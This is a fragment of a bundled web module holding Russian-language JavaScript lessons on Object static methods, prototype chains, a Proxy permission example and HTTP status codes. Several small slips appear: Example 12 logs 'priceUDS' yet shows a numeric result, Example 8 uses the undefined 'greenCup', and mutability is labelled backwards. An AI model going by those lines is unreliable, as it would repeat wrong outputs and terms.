x: {\n    value: undefined,\n    writable: true,\n    configurable: false,\n    enumerable: false\n  },\n  y: {\n    value: undefined,\n    writable: true,\n    configurable: false,\n    enumerable: false\n  },\n  radius: {\n    value: undefined,\n    writable: true,\n    configurable: false,\n    enumerable: false\n  }\n})\n~~~\n\n^^^\n\n\n◘◘circle◘◘\n\n~~~console\n\n▼ Figure {x: undefined, y: undefined, radius: undefined}\n    radius: undefined\n    x: undefined\n    y: undefined\n  ▼ __proto__: Figure\n        type: \"circle\"\n      ▼ __proto__:\n            className: \"Figure\"\n          ► constructor: ƒ Figure( figType )\n          ► __proto__: Object\n~~~\n\n\n~~~js\ncircle instanceof Figure  // true\n~~~\n\n_________________________________________________________\n\n\n◘◘![ico-25 cap] **Пример 5**◘◘\n\n~~~js\n\n// Создадим экземпляр объекта proto:\n\nvar proto = {\n  figure: 'circle',\n  size: 100,\n  clip: false,\n  changeFigure: function (newFigure) {\n    this.figure = newFigure\n  }\n}\n\n// А теперь вызовем метод Object.create() для создания экземпляра obj\n\nvar obj = Object.create(proto)\n~~~\n\n^^Все свойства и методы объекта **proto**, взятого в качестве прототипа, стали  унаследованными  свойствами и методами экземпляра **obj**^^\n\n◘◘obj◘◘\n\n~~~console\n\n▼ {}\n   ▼ __proto__:\n      ► changeFigure: ƒ(newFigure)\n        clip: false\n        figure: \"circle\"\n        size: 100\n      ► __proto__: Object\n~~~\n\n^^Теперь создадим простой конструктор:^^\n\n~~~js\nvar Creator = function (id, val) {\n  this.id = id\n  this.val = val\n}\n~~~\n\n^^и вызовем его как обычную функцию, передав контекст нашего экземпляра **obj**:^^\n\n~~~js\nCreator.call(obj, 'sample',  75)\n~~~\n\n**результат**\n\n![](illustrations/Object-static-props-01.png)\n\n\n________________________________________________________\n\n\n◘◘![ico-25 cap] **Пример 6**◘◘\n\n~~~js\n\n// Создадим конструктор Human:\n\nfunction Human (name = 'Тимофей', hobby = 'футбол') {\n  this.name = name\n  this.hobby = hobby\n}\n\nHuman.prototype = {\n  speciality: 'монтажник',\n  age: 20\n}\n\n// и воспользуемся методом Object.create() для создания нового экземпляра worker:\n\nvar worker = Object.create(new Human('Иван', 'рыбалка'))\n~~~\n\n◘◘worker◘◘\n\n~~~console\n\n▼ {}\n  ▼ __proto__:\n        hobby: \"рыбалка\"\n        name: \"Иван\"\n      ▼ __proto__:\n            age: 20\n            speciality: \"монтажник\"\n          ► __proto__: Object\n~~~\n\n\n^^А теперь проверим, что **worker** является экземпляром **_Human_**^^\n\n~~~js\nworker instanceof Human   // true\nworker instanceof Object  // true\n~~~\n\n_______________________________________________________\n\n\n◘◘![ico-25 cap] **Пример 7**◘◘\n\n~~~js\n\n// Объявим конструктор класса SuperClass\n\nfunction SuperClass () {\n  this.__proto__.type = 'SuperClass'\n  this.__proto__.name = 'Parent Class'\n}\n\n// Теперь используем метод Object.create()\n// для создания подкласса SubClass класса SuperClass\n\n// Для этого объявим конструктор подкласса SubClass:\n\nfunction SubClass () {\n  SuperClass.call(this)\n  this.name = 'Child Class'\n  this.type = 'SubClass'\n}\n\n// Конструктор SuperClass вызывается в конструкторе SubClass\n// как обычная функция, однако в контексте экземпляра\n\nvar sample = new SubClass()\n~~~\n\n**Результат**\n\n![](illustrations/Object-static-props-02.png)\n\n\n^^Обратите внимание, что **_SuperClass_** передал унаследованные свойства экземпляру, но при этом сам не появился в цепочке наследования:^^\n\n~~~js\nsample instanceof SubClass    // true\nsample instanceof SuperClass  // false\nsample instanceof Object      // true\n~~~\n\n^^В данном примере **_SuperClass_** выполняет функцию **_декоратора_**^^\n\n____________________________________________________\n\n\n◘◘![ico-25 cap] **Пример 8**◘◘\n\n~~~js\n// Объявляем конструктор класса Dishes\n\nfunction Dishes (type) {\n  this.type = 'dishes'\n  console.log('The constructor Dishes has created an instance: \\n', this)\n}\n\n// Создаем свойства и методы прототипа:\n\nDishes.prototype.wash = function () {\n  this.clean = true\n  console.info('The tableware has been washed.')\n}\nDishes.prototype.use = function () {\n  this.clean = false\n  console.info('The tableware has been used and it\\'s dirty now.')\n}\n\n// Теперь создадим конструктор класса Cup:\n\nfunction Cup (color) {\n  this.type = 'cup'\n  this.color = color || 'blue'\n}\n~~~\n\n^^Нужно сделать так, класс  **_Cup_**  был подклассом  класса   **_Dishes_**^^\n^^Используем прототип класса  **_Dishes_**:^^\n\n~~~js\nCup.prototype = Object.create(Dishes.prototype)\n~~~\n\n^^Для того, чтобы класс **_Cup_**  унаследовал собственные перечислимые свойства родительского класса **_Dishes_**, вызовем конструктор класса **_Dishes_** с передачей ему контекста  **_Cup_.~prototype~**:^^\n\n~~~js\nDishes.call(Cup.prototype)\n~~~\n\n^^Создадим экземпляр класса **_Cup_**:^^\n\n~~~js\nvar redCup = new Cup('red')\n~~~\n\n◘◘redCup◘◘\n\n~~~console\n\n▼ Cup {type: \"cup\", color: \"red\", clean: true}\n    clean: true\n    color: \"red\"\n    type: \"cup\"\n  ▼ __proto__: Dishes\n        type: \"dishes\"\n      ▼ __proto__:\n          ► use: ƒ ()\n          ► wash: ƒ ()\n          ► constructor: ƒ Dishes(type)\n          ► __proto__: Object\n~~~\n\n\n^^Итак, мы построили цепочку прототипов^^\n^^Для проверки, что наш экземпляр  **redCup**  принадлежит  одновременно классам  **_Cup_**  и  **_Dishes_**, воспользуемся оператором  **~instanceof~**:^^\n\n~~~js\nredCup instanceof Cup        // true\nredCup instanceof Dishes     // true\ngreenCup instanceof Object   // true\n~~~\n\n^^Теперь проверим, как работает наша \"машинка\"^^\n^^Мы уже создали экземпляр **redCup**^^\n^^Давайте используем чашку, а потом помоем ее^^\n\n~~~js\nredCup.use()  // The tableware has been used and it's dirty now.\n\nredCup.wash() // The tableware has been washed.\n~~~\n\n^^Аналогичный результат можно получить значительно проще, используя свойство **~&#95;&#95;proto&#95;&#95;~**^^\n\n_________________________________________________________________________\n\n~&#95;&#95;proto&#95;&#95;~  vs  ~Object.create()~\n\n\n◘◘![ico-25 cap] **Пример 9**◘◘\n\n~~~js\n// усложним задачу, удлинив цепочку прототипов еще одним классом - Kitchenware\n\n// Создадим конструктор класса Kitchenware\n\nvar Kitchenware = function () {\n  this.className = 'Kitchenware'\n  this.__proto__.constructor = Kitchenware\n}\n\n// Теперь создадим конструктор класса Dishes,\n// и используем конструктор Kitchenware\n// для создания прототипа экземпляров класса Dishes:\n\nvar Dishes = function () {\n  this.__proto__ = new Kitchenware()\n  this.__proto__.constructor = Dishes\n  this.className = 'Dishes'\n}\n\n// Теперь создадим конструктор класса Cup,\n// и используем конструктор Dishes\n// для создания прототипа экземпляров класса Cup:\n\nvar Cup = function ($color) {\n  this.__proto__ = new Dishes()\n  this.__proto__.constructor = Cup\n  this.className = 'Cup'\n  this.color = $color || 'white'\n}\n\n// Теперь создадим экземпляр yellowCup класса Cup\n// и выведем его в консоль:\n\nvar yellowCup = new Cup('yellow')\nconsole.log('*** cup:\\n', yellowCup)\n~~~\n\n![](illustrations/Object-static-props-03.png)\n\nвыведем в консоль цепочку прототипов, используя метод **Object.getPrototypeOf**:\n\n~~~js\nconsole.log(Object.getPrototypeOf(yellowCup))\n~~~\n\n![](illustrations/Object-static-props-04.png)\n\n~~~js\nconsole.log(Object.getPrototypeOf(Object.getPrototypeOf(yellowCup)))\n~~~\n\n![](illustrations/Object-static-props-05.png)\n\n^^Обратите внимание, что ссылка на конструктор задана в явном виде:^^\n\n~~~js\nthis.__proto__.constructor = Dishes\n~~~\n\n^^Это необходимо потому, что после выполнения присваивания^^\n\n~~~js\nthis.__proto__ = new Kitchenware()  \n~~~\n\n^^имя конструктора прототипа будет  **_Kitchenware_**, а не  **_Dishes_**^^\n\n^^Аналогично мы явно указываем ссылку на функцию-конструктор чашки:^^\n\n~~~js\nthis.__proto__.constructor = Cup\n~~~\n\n^^Однако воспользуемся теперь оператором **~instanceof~**^^\n\n~~~js\nyellowCup instanceof Kitchenware  // true\nyellowCup instanceof Dishes       // false\nyellowCup instanceof Cup          // false\nyellowCup instanceof Object       // true\n~~~\n\n^^Как мы видим, хотя в консоли цепочка прототипов выглядит вполне прилично, на самом деле произошла передача свойств вместо делегирования (т.н. \"наследования\")^^\n\n_____________________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/#Object.create)\n\n_____________________________________________________________________________\n\n## ![ico-25 icon] Object.defineProperty()\n\nЭтот метод позволяет создать объекту свойство с дескриптором\n\n![ico-20 green-ok] Первый аргумент метода - ссылка на объект, которому добавляется свойство\n![ico-20 green-ok] Второй аргумент - имя свойства ( строка )\n![ico-20 green-ok] Третий аргумент - объект дескриптора свойства\n\n◘◘![ico-25 cap] **Пример 10**◘◘\n\n~~~js\n// Добавим свойство type объекту sample и сделаем это свойство неперечислимым\n\nvar sample = {\n  name: 'figure',\n  size: 100,\n  color: 'red'\n}\nObject.defineProperty(sample, 'type', {\n  value: 'svg',\n  enumerable: false\n})\n\nObject.keys(sample)\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n► (3) [\"name\", \"size\", \"color\"]\n~~~\n\n______________________________________________________________________\n\n### ![ico-20 icon] геттер и сеттер свойства\n\n**Вычисляемые свойства**\n\n![ico-20 warn] Когда определяются атрибуты **~get()~**  и  **~set()~** в дескрипторе свойства, нельзя использовать атрибуты  **~writable~** и **~value~**\n\n◘◘![ico-25 cap] **Пример 11**◘◘\n\n~~~js\n// Добавим еще одно свойство объекту sample\n// Свойство operation будет  с геттером и сеттером\n\nObject.defineProperty(sample, 'operation', {\n  get: () => this.operation ? this.operation[0] : '?',\n  set: newVal => this.operation = newVal + '***'\n})\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n▼ {name: \"figure\", size: 100, color: \"red\", type: \"svg\"}\n    color: \"red\"\n    name: \"figure\"\n    size: 100\n    operation: (...)\n    type: \"svg\"\n  ► get operation: () => {…}\n  ► set operation: newVal => this.operation = newVal + \"***\"\n  ► __proto__: Object\n~~~\n\n___________________________________________________________\n\n◘◘![ico-25 cap] **Пример 12**◘◘\n\n~~~js\nvar course = 28\n\nvar thing = {\n  name: 'Утюг',\n  mark: 'Tefal',\n  priceUSD: 20\n}\n\nObject.defineProperty(thing, 'priceUAH', {\n  get: function () {\n    return this.priceUSD * course\n  },\n  set: function (newPriceUAH) {\n    this.priceUSD = newPriceUAH / course\n  }\n})\n\nconsole.log(thing.priceUAH) // 560\n\n// Теперь выполним присваивание значения вычисляемому свойству\n// ( вызывая под капотом сеттер этого свойства )\n\nthing.priceUAH = 450\n\nconsole.log(thing.priceUDS) // 8.928571428571429\n\n// Выведем в консоль дескриптор вычисляемого свойства priceUAH\n\nconsole.log(Object.getOwnPropertyDescriptor(thing, 'priceUAH'))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n▼ {get: ƒ, set: ƒ, enumerable: true, configurable: true}\n    configurable: true\n    enumerable: true\n  ► get: ƒ priceUAH()\n  ► set: ƒ priceUAH( newPriceUAH )\n  ► __proto__: Object\n~~~\n\n____________________________\n\n## ![ico-25 icon] Object.defineProperties()\n\nМожно добавить объекту сразу несколько свойств с дескрипторами\n\nСоздадим в разметке новый элемент **svg**\n\n~~~html\n<body>\n  <svg\n    width=\"400\"\n    height=\"400\"\n    style=\"border: 1px dotted;\"\n  />\n</body>\n~~~\n\nи добавим сразу два свойства объекту **sample** с помощью метода **_Object.defineProperties()_**:\n\n~~~js\nvar sample = {\n  name: 'figure',\n  size: 100,\n  color: 'red'\n}\n\nObject.defineProperties(sample, {\n  canvas: {\n    value: document.querySelector('svg'),\n    writable: false,\n    configurable: false,\n    enumerable: false\n  },\n  owner: {\n    get: () => this.owner || this,\n    set: newOwner => Object.assign(this, { owner: newOwner })\n  }\n})\n~~~\n\n![](illustrations/Object-static-props-06.png)\n\nОбратите внимание, что при создании геттера и сеттера свойства **owner** мы использовали стрелочную функцию. За счет этого контекст вызова геттера и сеттера будет:\n\n![](illustrations/Object-static-props-07.png)\n\nт.е. фактически при использовании сеттера мы создаем свойство **owner** глобальному объекту:\n\n~~~js\nsample.owner = sample\n~~~\n\n![](illustrations/Object-static-props-08.png)\n\n____________________________\n\n## ![ico-25 icon] Object.entries()\n\n**ES8 (2017)**\n\nВозвращает массив собственных перечислимых свойств экземпляра\nв виде массива из двух элементов: имени свойства и его значения\n\n~~~js\nvar obj = {\n  name: 'first',\n  type: 'circle',\n  color: 'red',\n  radius: 100,\n  center: [120, 120]\n}\n\nconsole.log(Object.entries(obj))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n▼ (5) [Array(2), Array(2), Array(2), Array(2), Array(2)]\n  ► 0: (2) [\"name\", \"first\"]\n  ► 1: (2) [\"type\", \"circle\"]\n  ► 2: (2) [\"color\", \"red\"]\n  ► 3: (2) [\"radius\", 100]\n  ► 4: (2) [\"center\", Array(2)]\n    length: 5\n  ► __proto__: Array(0)\n~~~\n\n________________________________________\n\n◘◘![ico-25 cap] **Пример 13**◘◘\n\n~~~js\n// Нарисуем окружность\n\nvar obj = {\n  width: '30%',\n  height: '30%',\n  border: 'solid 1px red',\n  borderRadius: '50%',\n  position: 'fixed',\n  top: '10%',\n  left: '10%'\n}\n\nvar elem = document.body\n  .appendChild(document.createElement('div'))\n\nObject.entries(obj)\n  .forEach(prop => elem.style[prop[0]] = prop[1])\n~~~\n\n____________________\n\n◘◘![ico-25 cap] **Пример 14**◘◘\n\n\n~~~js\n// Выведем все свойства объекта obj в консоль\n\nconsole.info('obj = {\\n')\nfor (var x of Object.entries(obj)) {\n  console.info(`     ${x[0]}:${x[1]}\\n`)\n}\nconsole.info('}')\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\nobj = {\n      width:30%\n      height:30%\n      border:solid 1px red\n      borderRadius:50%\n      position:fixed\n      top:10%\n      left:10%\n}\n~~~\n\n____________________________\n\n## ![ico-25 icon] Object.freeze()\n\nЧисла, строки и булевы значения в JS **_неиммутабельны_**, т.е. их значения не меняются при операциях с ними, но каждый раз возвращается новое значение\n\n◘◘![ico-25 cap] **Пример 15**◘◘\n\n~~~js\nvar string = 'Welcome to JS!'\n\nstring.split(' ') // [\"Welcome\", \"to\", \"JS!\"]\n\nconsole.log(string) // \"Welcome to JS!\"\n~~~\n\n_______________________________________________________________________\n\nОбъекты и массивы JS по природе своей **_иммутабельны_** ( изменяемы )\n\n◘◘![ico-25 cap] **Пример 16**◘◘\n\n~~~js\nvar food = ['milk', 'apple', 'soup']\n\nfood.push('meat')\n\nconsole.log(food) // [\"milk\", \"apple\", \"soup\", \"meat\"]\n~~~\n\n_______________________________________________________________________\n\nМы легко добавляем новые свойства объекту:\n\n◘◘![ico-25 cap] **Пример 17**◘◘\n\n~~~js\nvar provider = { name: 'Google' }\n\nprovider.addProp = function (propName, propVal) {\n  this[propName] = propVal\n}\n\nprovider.addProp('browser', 'Chrome')\n\nconsole.log(provider) // { name: \"Google\", browser: \"Chrome\" }\n~~~\n\n____________________________________________________\n\n**Метод ~Object.freeze~ делает объект неиммутабельным, т.е. предотвращает:**\n\n^^^[добавление новых свойств к объекту]\n\n![ico-25 cap] **Пример 18**\n\n~~~js\nvar provider = { name: 'Google' }\n\nObject.freeze(provider)\n\nprovider.addProp = function (propName, propVal) {\n  this[propName] = propVal\n}\n\nconsole.log(provider) // { name: \"Google\" }\n~~~\n\n^^^\n\n^^^[удаление свойств объекта]\n\n![ico-25 cap] **Пример 19**\n\n~~~js\nvar provider = { name: 'Google', service: 'API' }\n\nObject.freeze(provider)\n\ndelete provider.service  // false\n\nconsole.log(provider) // { name: \"Google\", service: \"API\" }\n~~~\n\n^^^\n\n^^^[изменение существующих свойств объекта]\n\n![ico-25 cap] **Пример 20**\n\n~~~js\nvar provider = { name: \"Google\", service: \"API\" }\n\nObject.freeze ( provider )\n\nprovider.name = \"Mozilla\"\n\nconsole.log ( provider.name ) // Google\n~~~\n\n^^^\n\n^^^[изменение дескрипторов свойств объекта]\n\nизменение значений **enumerable**, **configurable** и **writable**\n\n◘◘![ico-25 cap] **Пример 21**◘◘\n\n~~~js\n// Изменим дескриптор свойства объекта до \"заморозки\":\n\nvar provider = { name: 'Google', service: 'API' }\n\nObject.defineProperty(provider, 'name', {\n  enumerable: false,\n  writable: false\n})\n\nfor (var prop in provider) {\n  console.log(`${prop}: ${provider [ prop ]}`)\n}\n\n// service: API\n~~~\n\nКак видите, свойство **name** стало неперечислимым\n\nПроверим, изменяемо ли оно:\n\n~~~js\nprovider.name = 'Mozilla'\n\nconsole.log(provider.name) // \"Google\"\n~~~\n\nТеперь опять изменим дескриптор свойства **name** и изменим его значение:\n\n~~~js\nObject.defineProperty(provider, 'name', {\n  enumerable: true,\n  writable: true\n})\n\nprovider.name = 'Mozilla'\n~~~\n\nВыведем все перечислимые свойства объекта:\n\n~~~js\nfor (var prop in provider) {\n  console.log(`${prop}: ${provider [ prop ]}`)\n}\n\n// name: Mozilla\n// service: API\n~~~\n\nТ.е. мы опять сделали свойство **name** перечислимым\n\nА теперь \"заморозим\" объект и попробуем переконфигурировать свойство **service**\n\n~~~js\nObject.freeze(provider)\n\nObject.defineProperty(provider, 'service', {\n  enumerable: false,\n  writable: false\n})\n~~~\n\nБудет сгенерировано исключение:\n\n••![ico-20 error] Uncaught TypeError: Cannot redefine property: service••\n\nОднако изменить значение свойства **service** мы не сможем, хотя нам и не удалось изменить дескриптор этого свойства\n\nПочему? Заглянем теперь в дескриптор:\n\n~~~js\nObject.getOwnPropertyDescriptor(provider, 'service')\n~~~\n\n••► { value: \"API\", writable: false, enumerable: true, configurable: false }••\n\nТ.е. в результате \"заморозки\" объекта дескрипторы его свойств были автоматически изменены: свойства стали неизменяемы и не конфигурируемы\n\nЕдинственное, что \"не зацепила\" заморозка объекта - это атрибут **_enumerable_**\n\nЕсли мы сами не установим его значение в ~false~ перед заморозкой, то свойства будут перечислимыми\n\n^^^\n_________________________________________________________________________________________________\n\n## ![ico-25 icon] Object.getOwnPropertyDescriptor()\n\nЭтот метод позволяет получить дескриптор собственного свойства объекта\nВозвращает **объект дескриптора** свойства\n![ico-20 pin] первым аргументом метода является объект ( ссылка )\n![ico-20 pin] второй аргумент - имя свойства объекта ( строка )\n\n### ![ico-20 icon] Дескрипторы свойств\n\nДля каждого свойства объекта существует **дескриптор свойства**\nДескриптор свойства - это **_объект_**, который содержит атрибуты свойства:\n\n| ^^атрибут&nbsp;свойства^^ | ^^содержание^^ | ^^значение&nbsp;по&nbsp;умолчанию^^ |\n| **~value~** | ^^значение свойства^^ | ^^**_undefined_**^^ |\n| **~writable~** | ^^можно ли изменять значение свойства<br>( ~_true_~ &#124; ~_false_~)^^ | ^^**_true_**^^ |\n| **~set~** | ^^сеттер свойства^^<br> ^^( функция, которая вызывается при записи значения свойства )^^ | ^^**_undefined_**^^ |\n| **~get~** | ^^геттер свойства<br>( функция, которая вызывается при чтении значения свойства )^^ | ^^**_undefined_**^^ |\n| **~enumerable~** | ^^является свойство перечислимым, или нет<br>т.е. будет ли оно итерироваться оператором **_for..in_**<br>и возвращаться при вызове метода **_Object.keys()_**<br>( ~_true_~ &#124; ~_false_~ )^^ | ^^**_false_**^^ |\n| **~configurable~** | ^^доступно ли свойство для модификации ( удаления, изменения атрибутов свойства )<br>можно ли конфигурировать свойство с помощью метода **_defineProperty_**<br>( ~_true_~ &#124; ~_false_~ )^^ | ^^**_false_**^^ |\n\n_________________________________________________________________\n\n◘◘![ico-25 cap] **Пример 22**◘◘\n\n~~~js\nvar newObject = {\n  name: 'Егор',\n  age: 25,\n  write: true,\n  read: true,\n  getName () {},\n  setName () {}\n}\nObject.getOwnPropertyDescriptor(newObject, 'getName')\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n▼ {value: ƒ, writable: true, enumerable: true, configurable: true}\n    configurable: true\n    enumerable: true\n  ► value: ƒ getName()\n    writable: true\n  ► __proto__: Object\n~~~\n\n\n____________________________\n\n## ![ico-25 icon] Object.getOwnPropertyDescriptors()\n\n**ES8 (2017)**\n\nПолучает ссылку на объект\nВозвращает объект, у которого:\n• имена свойств - это имена свойств исходного объекта\n• значения свойств - это дескрипторы свойств исходного объекта\n\n~~~js\nvar obj = {\n  name: 'first',\n  type: 'circle',\n  color: 'red',\n  radius: 100,\n  center: [120, 120]\n}\n\nObject.getOwnPropertyDescriptors(obj)\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n▼ {name: {…}, type: {…}, color: {…}, radius: {…}, center: {…}}\n  ► center: {value: Array(2), writable: true, enumerable: true, configurable: true}\n  ► color: {value: \"red\", writable: true, enumerable: true, configurable: true}\n  ► name: {value: \"first\", writable: true, enumerable: true, configurable: true}\n  ► radius: {value: 100, writable: true, enumerable: true, configurable: true}\n  ► type: {value: \"circle\", writable: true, enumerable: true, configurable: true}\n  ► __proto__: Object\n~~~\n\n____________________________\n\n## ![ico-25 icon] Object.getOwnPropertyNames()\n\nВозвращает имена собственных свойств ( методов ) объекта\n\n~~~js\nvar funcObject = {\n  getName () {},\n  setName () {}\n}\nvar newObject = Object.assign({}, { name: 'Егор', age: 25 }, { write: true, read: true }, funcObject)\nObject.getOwnPropertyNames(newObject)\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n(6) [\"name\", \"age\", \"write\", \"read\", \"getName\", \"setName\"]\n~~~\n____________________________\n\n## ![ico-25 icon] Object.keys()\n\nвозвращает массив всех **_собственных перечислимых_** свойств экземпляра\nаргумент - ссылка на экземпляр\n\n◘◘![ico-25 cap] **Пример 23**◘◘\n\n~~~js\nvar Human = function () {\n  this.name = arguments [ 0 ] || 'Тимофей'\n  this.age = arguments [ 1 ] || 25\n  this.speciality = arguments[2] || 'слесарь'\n}\n\nHuman.prototype.setSpeciality = function (spec) {\n  this.speciality = spec\n}\n\nvar man = new Human(null)\n\n// Добавим в прототип Human новое свойство employed:\n\nHuman.prototype.employed = false\nconsole.log(man.employed)  // false\n\n// выведем в консоль собственные перечислимые свойства экземпляра  man\n\nconsole.log(Object.keys(man))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n(3) [ \"name\", \"age\", \"speciality\" ]\n~~~\n\nвыведем перечислимые свойства прототипа:\n\n~~~js\nconsole.log(Object.keys(Human.prototype))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n(2) [ \"setSpeciality\", \"employed\" ]\n~~~\n\nВыполним присваивание:\n\n~~~js\nman.employed = true\nconsole.log(Object.keys(man))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n(4) [ \"name\", \"age\", \"speciality\", \"employed\" ]\n~~~\n\nу экземпляра **man** появилось собственное свойство  **_employed_**, но у прототипа и экземпляра это совершенно различные свойства:\n\n~~~js\nconsole.log(man.employed)           // true\nconsole.log(man.__proto__.employed) // false\n~~~\n____________________________\n\n## ![ico-25 icon] Object.setPrototypeOf()\n\nМетод добавляет в цепочку прототипов объекта, указанного первым аргументом,\nссылку на другой объект, указанный вторым аргументом\n\n◘◘![ico-25 cap] **Пример 24**◘◘\n\n~~~js\n// Создадим объект proto с двумя методами: valueOf() и getName()\n\nconst proto = {\n  valueOf () {\n    return this[Object.keys(this).find(key => !isNaN(this[key]))] || 0\n  },\n  getName () {\n    return this.name || 'user'\n  }\n}\n~~~\n\n**Методы объекта proto**\n\n^^Метод **_valueOf()_** ищет среди собственных перечислимых свойств объекта любое свойство, которое при приведении к числу вернет не **~NaN~**, и возвращает числовое значение этого свойства^^\n^^или, если такого свойства не обнаружено, возвращает 0^^\n\n^^Метод **_getName()_** ищет среди свойств объекта свойство **_name_**, и если находит, то возвращает его значение, в противном случае возвращает \"_user_\"^^\n\n\nСоздадим объект **admin**:\n\n~~~js\nconst admin = {\n  name: 'Stephan',\n  age: 25\n}\n~~~\n\nЛегко убедиться, что в цепочке прототипов объекта **admin** есть только ссылка на объект **~prototype~** конструктора **_Object_**\n\n◘◘admin◘◘\n\n~~~console\n\n▼ { name: \"Stephan\", age: 25 }\n    age: 25\n    name: \"Stephan\"\n  ▼ __proto__:\n      ► constructor: ƒ Object()\n      ► hasOwnProperty: ƒ hasOwnProperty()\n      ► isPrototypeOf: ƒ isPrototypeOf()\n      ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n      ► toLocaleString: ƒ toLocaleString()\n      ► toString: ƒ toString()\n      ► valueOf: ƒ valueOf()\n      ► __defineGetter__: ƒ __defineGetter__()\n      ► __defineSetter__: ƒ __defineSetter__()\n      ► __lookupGetter__: ƒ __lookupGetter__()\n      ► __lookupSetter__: ƒ __lookupSetter__()\n      ► get __proto__: ƒ __proto__()\n      ► set __proto__: ƒ __proto__()\n~~~\n\n\nС помощью метода **~Object.setPrototypeOf~** передадим объекту **admin** в наследство объект **proto**:\n\n~~~js\nObject.setPrototypeOf(admin, proto)\n~~~\n\nВыведем объект **admin** в консоль и убедимся, что в его цепочке прототипов появилось еще одно звено - ссылка на объект **proto**:\n\n◘◘admin◘◘\n\n~~~console\n\n▼ { name: \"Stephan\", age: 25 }\n    age: 25\n    name: \"Stephan\"\n  ▼ __proto__:\n      ► getName: getName() { return this[ Object.keys ( this ) .find ( key => {…}\n      ► valueOf: valueOf() { let prop = Object.keys ( this ) .find ( key => {…}\n      ► __proto__: Object\n~~~\n\n\nВызовем унаследованные объектом **admin** методы объекта **proto**\n\n~~~js\nconsole.log(admin.getName()) // Stephan\nconsole.log(admin.valueOf()) // 25\n~~~\n\nТеперь создадим объект **user**\n\n~~~js\nconst user = {\n  login: 'Stephan',\n  hobby: 'fishing'\n}\n~~~\n\nу которого нет свойства **_name_** и нет свойств, которые при приведении к числу не вернут **~NaN~**\n\nпередадим ему в наследство объект **proto**\n\n~~~js\nObject.setPrototypeOf(user, proto)\n~~~\n\nи вызовем унаследованные методы:\n\n~~~js\nconsole.log(user.getName()) // user\nconsole.log(user.valueOf()) // 0\n~~~\n____________________________\n\n## ![ico-25 icon] Object.values()\n\n**ES8 (2017)**\n\nВозвращает **массив** **_значений_** собственных перечислимых свойств экземпляра,\nт.е. тех свойств, имена которых возвращает метод **~Object.keys()~**\n\n~~~js\nvar obj = {\n  name: 'first',\n  type: 'circle',\n  color: 'red',\n  radius: 100,\n  center: [120, 120]\n}\n\nconsole.log(Object.values(obj))\n~~~\n\n◘◘^^Результат^^◘◘\n\n~~~console\n\n(5) [\"first\", \"circle\", \"red\", 100, Array(2)]\n~~~\n____________________________\n\n^^![ico-25 icon] Object.getOwnPropertySymbols()^^\n^^![ico-25 icon] Object.getPrototypeOf()^^\n^^![ico-25 icon] Object.is()^^\n^^![ico-25 icon] Object.isExtensible()^^\n^^![ico-25 icon] Object.isFrozen()^^\n^^![ico-25 icon] Object.isSealed()^^\n^^![ico-25 icon] Object.seal()^^\n\n[![ico-30 link] MDN](external/mdn-object-static-props)\n____________________________\n\n[![ico-30 hw] Quiz](quiz/Object)\n"},77804:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Proxy\n\nПоместим в глобальный реестр символов символ ~permissions~, в котором будут описаны права текущего пользователя:\n~~~js\nconst permissions = Symbol.for(JSON.stringify({\n  read: true,\n  write: false,\n  config: false\n}))\n~~~\nС помощью этого символа мы будем контролировать доступ к свойствам проксируемого объекта\n\nДля проксирования доступа к некоему объекту ~target~ нам нужен объект ~handler~ с набором методов доступа:\n~~~js\nconst handler = {\n  get(target, key) {\n    if (JSON.parse(Symbol.keyFor(permissions)).read) {\n      return target[key]\n    }\n    return null\n  },\n  set(target, key, value) {\n    if (JSON.parse(Symbol.keyFor(permissions)).write) {\n      target[key] = value\n      return true\n    }\n    return false\n  },\n  deleteProperty(target, key) {\n    if (JSON.parse(Symbol.keyFor(permissions)).config) {\n      delete target[key]\n      return true\n    }\n    return false\n  }\n}\n~~~\n\nА теперь создадим проксируемый объект:\n~~~js\nconst user = new Proxy({\n  name: 'Piter',\n  age: 30,\n  hobby: 'football',\n}, handler)\n~~~\n\nТеперь можно \"читать\" содержимое объекта user, но изменить что-то в этом объекте нельзя\n\nОднако если изменить символ ~permissions~, то можно предоставить права на измение содержимого объекта\n\nНапример, можно предоставить доступ на перезапись свойств:\n\n~~~js\nconst permissions = Symbol.for(JSON.stringify({\n  read: true,\n  write: true,\n  config: false\n}))\n~~~\n\nили полный доступ к объекту:\n\n~~~js\nconst permissions = Symbol.for(JSON.stringify({\n  read: true,\n  write: true,\n  config: true\n}))\n~~~\n\nПримечание:\nдля обеспечения полного проксирования объекта стоит включить в ~handler~:\n\n• setPrototypeOf\n• defineProperty\n• construct\n\n__________________________________\n\n[%%%MDN%%%](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)"},11371:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-25 icon] Status\n\n![ico-20 green-ok] **200** (OK)\n\n^^ответ на успешные ~GET~, ~PUT~, ~PATCH~ или ~DELETE~^^\n\n^^Этот код также используется для POST, который не приводит к созданию нового ресурса^^\n\n![ico-20 green-ok] **201** (Created)\n\n^^ответ на ~POST~, который приводит к созданию нового ресурса^^\n\n![ico-20 green-ok] **204** (Нет содержимого)\n\n^^ответ _без тела_ на успешный запрос (например, на запрос ~DELETE~)^^\n\n![ico-20 green-ok] **400** (Bad Request)\n\n^^запрос искажен (например, если тело не может быть проанализировано)^^\n\n![ico-20 green-ok] **401** (Unauthorized)\n\n^^не указаны или недействительны данные аутентификации^^\n\n![ico-20 green-ok] **403** (Forbidden)\n\n^^аутентификация прошла успешно, но пользователь не имеет прав доступа к ресурсу^^\n\n![ico-20 green-ok] **404** (Not found)\n\n^^запрашивается несуществующий ресурс^^\n\n![ico-20 green-ok] **405** (Method Not Allowed)\n\n^^запрошенный HTTP-метод не разрешен для данного 